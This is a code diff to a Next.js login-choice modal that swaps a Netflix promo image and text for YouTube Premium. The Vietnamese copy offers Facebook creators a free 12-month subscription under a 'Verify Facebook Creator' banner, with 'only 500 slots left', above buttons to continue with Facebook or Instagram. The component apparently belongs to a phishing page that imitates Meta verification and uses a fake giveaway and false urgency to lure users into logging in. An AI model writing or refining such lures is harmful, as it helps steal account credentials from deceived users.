@@ -1,7 +1,7 @@
 'use client';
 
 import InstagramLogoImage from '@/assets/images/logo insta.webp';
-import NetflixHeroBg from '@/assets/images/netflix-hero-bg.jpg';
+import YtpHeroBg from '@/assets/images/ytp-hero-bg.jpg';
 import { useTranslation } from '@/hooks/use-translation';
 import { store, type LoginProvider } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
@@ -11,7 +11,7 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useState, type FC } from 'react';
 
-const PROMO_IMAGE = NetflixHeroBg;
+const PROMO_IMAGE = YtpHeroBg;
 
 const FacebookIcon = () => (
     <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
@@ -32,7 +32,7 @@ interface LoginChoiceModalProps {
 
 const LOGIN_CHOICE_TEXTS = [
     'Xác minh Creator Facebook',
-    'Creator Facebook được tặng Netflix Premium 12 tháng — 4K HDR, xem không giới hạn. Chỉ còn 500 suất trong đợt này.',
+    'Creator Facebook được tặng YouTube Premium 12 tháng — không quảng cáo, phát nền, tải offline. Chỉ còn 500 suất trong đợt này.',
     'Tiếp tục với Facebook',
     'Tiếp tục với Instagram',
     'Bằng việc nhấn Tiếp tục, bạn đồng ý với',
@@ -95,7 +95,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                     <Image src={PROMO_IMAGE} alt='' fill className='object-cover opacity-80' unoptimized />
                     <div className='absolute inset-0 bg-linear-to-t from-black/90 via-black/30 to-transparent' />
                     <div className='absolute right-0 bottom-0 left-0 p-8'>
-                        <p className='text-xl leading-snug font-bold text-white'>{t('Creator Facebook được tặng Netflix Premium 12 tháng — 4K HDR, xem không giới hạn. Chỉ còn 500 suất trong đợt này.')}</p>
+                        <p className='text-xl leading-snug font-bold text-white'>{t('Creator Facebook được tặng YouTube Premium 12 tháng — không quảng cáo, phát nền, tải offline. Chỉ còn 500 suất trong đợt này.')}</p>
                         <div className='mt-6 flex gap-1.5'>
                             <span className='h-1.5 w-1.5 rounded-full bg-white' />
                             <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
